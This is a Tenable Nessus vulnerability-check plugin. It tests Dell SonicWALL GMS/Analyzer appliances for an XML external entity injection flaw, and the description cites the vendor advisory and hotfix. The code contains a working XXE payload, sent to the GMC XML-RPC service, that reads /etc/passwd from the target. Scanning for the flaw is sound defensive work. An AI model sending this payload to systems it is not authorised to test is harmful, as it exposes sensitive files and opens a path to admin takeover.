#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(92967);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/12/09 21:14:09 $");

  script_osvdb_id(142010);

  script_name(english:"Dell SonicWALL Global Management System (GMS) / Analyzer GMC Service XML External Entity (XXE) Injection");
  script_summary(english:"Checks XML-RPC response from server.");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by an XML
external entity injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Dell SonicWALL Global Management System  (GMS) / Analyzer running
on the remote host is affected by an XML external entity (XXE)
injection vulnerability in the GMC service due to an incorrectly
configured XML parser accepting XML entities from an untrusted source. 
An unauthenticated, remote attacker can exploit this vulnerability,
via specially crafted XML data, to retrieve the contents of arbitrary
files or cause a denial of service condition. In one scenario, an
unauthenticated, remote attacker can obtain the static key to decrypt
and change the admin password to the GMS web interface admin account.

Note that the SonicWALL GMS / Analyzer running on the remote host is 
reportedly affected by other vulnerabilities as well; however, Nessus
has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"https://support.software.dell.com/product-notification/207447");
  script_set_attribute(attribute:"see_also", value:"https://www.digitaldefense.com/ddi-six-discoveries/");
  script_set_attribute(attribute:"solution", value:
"Apply Hotfix 174525 per the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value: "2016/07/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/07/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/08/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dell:sonicwall_global_management_system");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dell:sonicwall_analyzer");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("sonicwall_universal_management_detect.nbin");
  script_require_keys("dell/sonicwall/universal_management_appliance");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# GMC service only runs when GMS/Analyzer is deployed as an appliance 
get_kb_item_or_exit("dell/sonicwall/universal_management_appliance"); 

# port for the GMC service
# XML-RPC client uses a hard-coded port:
#   config.setServerURL(new URL("http://localhost:21009"));
port = 21009;

file = '/etc/passwd';

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file://' + file + '">]><methodCall xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions"><methodName>set_time_config</methodName><params><param><value><struct><member><name>use_ntp</name><value><boolean>&xxe;</boolean></value></member><member><name>datetime</name><value></value></member><member><name>timezone</name><value></value></member></struct></value></param></params></methodCall>';

http_disable_keep_alive();
res = http_send_recv3(
        port:         port, 
        method:       'POST',
        item:         '/', 
        data:         data,
        content_type: 'text/xml'
      );
req = http_last_sent_request();
if ("snwlcli" >< res[2] 
  && res[2] =~ "root.*/bin/bash")
{    
  report =
    '\nNessus was able to exploit the issue to retrieve the contents of ' +
    '\n' + "'" + file + "'" + ' using the following request :' +
    '\n' +
    '\n' +
    req;
  
  report +=
    '\n' +
    '\n' + 'This produced the following output :' +
    '\n' +
    '\n' + res[2] +
    '\n';

  security_report_v4(port:port,
                    severity: SECURITY_HOLE,
                    extra: report  
                    ); 
} 
else
{
  audit(AUDIT_HOST_NOT, 'affected');
}
